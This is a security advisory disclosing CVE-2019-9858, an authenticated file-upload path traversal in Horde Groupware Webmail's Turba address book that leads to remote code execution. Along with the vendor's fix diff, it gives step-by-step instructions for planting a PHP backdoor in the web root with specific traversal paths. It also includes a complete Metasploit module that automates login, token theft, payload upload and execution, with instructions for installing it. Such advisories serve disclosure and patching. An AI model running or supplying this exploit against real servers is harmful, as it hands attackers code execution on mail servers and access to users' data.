**Vulnerabilities Summary**<br>
The following advisory discusses an arbitrary file injection vulnerability that leads to remote code execution in Horde Groupware Webmail. This vulnerability can be exploited by any authenticated, unprivileged user which able to create a malicious PHP file under the Horde web root and gain arbitrary code execution on the server. The vulnerability is located in the core Horde source code and has been proven exploitable with the installed default Turba address book component.

**CVE**<br>
CVE-2019-9858

**Credit**<br>
An independent security researcher, Ratiosec, has reported this vulnerability to SSD Secure Disclosur program.

**Affected systems**<br>
The exploit has been proven working with the stable release Horde Groupware Webmail 5.2.22 and 5.2.17. Other versions may also be affected.

**Vendor Response**<br>
“Here is the proposed fix for this vulnerability. It should be released in Horde_Form in a day or two.”

```PHP

diff --git a/lib/Horde/Form/Type.php b/lib/Horde/Form/Type.php
index e92c790..f1e8157 100644
--- a/lib/Horde/Form/Type.php
+++ b/lib/Horde/Form/Type.php
@@ -1205,7 +1205,7 @@ class Horde_Form_Type_image extends Horde_Form_Type {
              /* Get the temp file if already one uploaded, otherwise create a
               * new temporary file. */
              if (!empty($upload['img']['file'])) {
-                $tmp_file = Horde::getTempDir() . '/' .
$upload['img']['file'];
+                $tmp_file = Horde::getTempDir() . '/' .
basename($upload['img']['file']);
              } else {
                  $tmp_file = Horde::getTempFile('Horde', false);
```

**Vulnerability Details**<br>
The Horde file “Horde/Form/Type.php” contains the vulnerable class that handles the image upload in forms.
When the “Horde_Form_Type_image” method “onSubmit()” is called on uploads it invokes the functions “getImage()” and “_getUpload()”, which uses unsanitized user input as path to save the image.

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/Horde-Groupware-Vulnerability-1.png">

The unsanitized POST parameter “object[photo][img][file]” is saved in the
“$upload[‘img’][‘file’]” PHP variable, allowing an attacker to manipulate the “$tmp_file” passed to “move_uploaded_file()” to save the uploaded file.
Set the parameter to e.g. “../usr/share/horde/static/bd.php” to write a PHP backdoor inside the web root. The “static/” destination folder is a good candidate to drop the backdoor because is always writable in Horde installations.
The unsanitized POST parameter went probably unnoticed because it’s never submitted by the forms which default to securely use a random path.

**Exploit**<br>
1) Log into the Horde Groupware Webmail as normal user.<br>
2) Access the “New Contact” view via “Address Book” in the menu.<br>
3) Create a PHP backdoor file on your disk.<br>
4) Fill the mandatory fields submitting the PHP backdoor in the “Photo” file field. The file name is irrelevant. <br>

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/Horde-Groupware-Vulnerability-2.png">

5) Click the Add button and intercept the outgoing HTTP request using Burp Suite. You should see the POST data including the uploaded PHP backdoor.
<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/Horde-Groupware-Vulnerability-3.png">

6) Add the new POST field “object[photo][img][file]” with the path to traverse the temporary folder and save the PHP backdoor under the “static/” folder. Two path traversals have been found working in different installations:<br>
A. ../usr/share/horde/static/bd.php , working with Horde installed with “apt-get”<br>
B. ../var/www/html/horde/static/bd.php”, working with Horde manually installed with PEAR<br>

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/Horde-Groupware-Vulnerability-4.png"><br>

7) Forward the request to the target server.<br>
8) Use the uploaded PHP file to execute arbitrary commands.<br>

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/Horde-Groupware-Vulnerability-5-1.png">

**Exploit**<br>
```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'Horde Turba File Upload Vulnerability',
      'Description'     => %q{
          Horde Groupware Webmail contains a flaw that allows an authenticated remote
          attacker to execute arbitrary PHP code. The exploitation requires the Turba
          subcomponent to be installed. This module was tested on versions 5.2.22 and 5.2.17.
        },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Ratiosec', # Vulnerability Disclosure and module
        ],
      'References'      =>
        [
        ],
      'DisclosureDate'  => 'Aug 17 2017',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [
    ['Automatic', { }],
    ['PEAR', { 'path': '/var/www/html/'}],
    ['Ubuntu', { 'path': '/usr/share/horde/' }],
    ],
      'DefaultTarget'   => 0
    ))
    register_options(
      [
        OptString.new('TARGETURI',  [true, 'The base path to the web application', '/']),
        OptString.new('USERNAME',   [true, 'The username to authenticate with']),
        OptString.new('PASSWORD',   [true, 'The password to authenticate with'])
      ])
  end
  def check
    vprint_status("Authenticating using #{username}:#{password}")
    cookie = horde_login(username, password)
    return Exploit::CheckCode::Unknown unless cookie
    res = send_request_cgi(
      'method'      => 'GET',
      'uri'         => normalize_uri(target_uri, '/turba/add.php'),
      'cookie'      => cookie
    )
    if res && res.code == 200
    if res.body.include?('Groupware 5.2.22') || res.body.include?('Groupware 5.2.17')
    return Exploit::CheckCode::Vulnerable
      end
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end
  def username
    datastore['USERNAME']
  end
  def password
    datastore['PASSWORD']
  end
  def horde_login(user, pass)
    res = send_request_cgi(
      'method'      => 'GET',
      'uri'         => normalize_uri(target_uri, 'login.php')
    )
    fail_with(Failure::Unreachable, 'No response received from the target.') unless res
    session_cookie = res.get_cookies
    vprint_status("Logging in...")
    res = send_request_cgi(
      'method'      => 'POST',
      'uri'         => normalize_uri(target_uri, 'login.php'),
      'cookie'      => session_cookie,
      'vars_post'   => {
        'horde_user'  => user,
        'horde_pass'  => pass,
        'login_post'    => '1'
      }
    )
    return res.get_cookies if res && res.code == 302
    nil
  end
  def get_tokens(cookie)
    res = send_request_cgi(
      'method'      => 'GET',
      'uri'         => normalize_uri(target_uri, 'turba', 'add.php'),
      'cookie'      => cookie
    )
    if res && res.code == 200
      if res.body.scan /turba\/add\.php\?source=(.+)"/
          source_token = Regexp.last_match.to_a[1..-1].find{|x| x != "favourites" }
      if res.body =~ /name="turba_form_addcontact_formToken" value="(.+)"/
        form_token = Regexp.last_match[1]
        return source_token, form_token, res.get_cookies
      end
      end
    end
    nil
  end
  def exploit
    vprint_status("Authenticating using #{username}:#{password}")
    cookie = horde_login(username, password)
    fail_with(Failure::NoAccess, 'Unable to login. Verify USERNAME/PASSWORD or TARGETURI.') if cookie.nil?
    vprint_good("Authenticated to Horde.")
    tokens = get_tokens(cookie)
    fail_with(Failure::Unknown, 'Error extracting tokens.') if tokens.nil?
    source_token, form_token, secret_cookie = tokens
    vprint_good("Tokens \"#{source_token}\", \"#{form_token}\", and cookie \"#{secret_cookie}\" found.")
    targets[1..-1].each do |curr_target|
    if target.name =~ /Automatic/ or curr_target == target
      payload_name = Rex::Text.rand_text_alpha_lower(10)
      payload_path = File.join(curr_target[:path], "static", "#{payload_name}.php")
      payload_path_traversal = File.join("..", payload_path)
      vprint_status("Preparing payload for target #{curr_target.name}...")
      data = Rex::MIME::Message.new
      data.add_part(payload.encoded, 'image/png', nil, "form-data; name=\"object[photo][new]\"; filename=\"#{payload_name}.png\"")
      data.add_part("turba_form_addcontact", nil, nil, 'form-data; name="formname"')
      data.add_part(form_token, nil, nil, 'form-data; name="turba_form_addcontact_formToken"')
      data.add_part(source_token, nil, nil, 'form-data; name="source"')
      data.add_part(payload_path_traversal, nil, nil, 'form-data; name="object[photo][img][file]"')
      post_data = data.to_s
      vprint_status("Uploading payload to #{payload_path_traversal}")
      res = send_request_cgi(
        'method'    => 'POST',
        'uri'       => normalize_uri(target_uri, 'turba', 'add.php'),
        'ctype'     => "multipart/form-data; boundary=#{data.bound}",
        'data'      => post_data,
        'cookie'    => cookie + ' ' + secret_cookie
      )
      fail_with(Failure::Unknown, "Unable to upload payload to #{payload_path_traversal}.") unless res && res.code == 200
      payload_url = normalize_uri(target_uri, 'static', "#{payload_name}.php")
      vprint_status("Executing the payload at #{payload_url}.")
      res = send_request_cgi(
        'uri'     => payload_url,
        'method'  => 'GET'
      )
      if res and res.code != 200
        vprint_bad("URL #{payload_url} hasn't been created or is not callable")
      else
        register_files_for_cleanup(payload_path)
        break
      end
    end
   end
  end
end
```

Install the module under ~/.msf4/modules/exploits/unix/webapp/horde_turba_file_upload.rb.
The module automatically exploits the Horde across different  configurations, both if manually installed with PEAR or with apt-get.

<img src="https://ssd-disclosure.com/wp-content/uploads/2019/03/Horde-Groupware-Vulnerability-6.png">
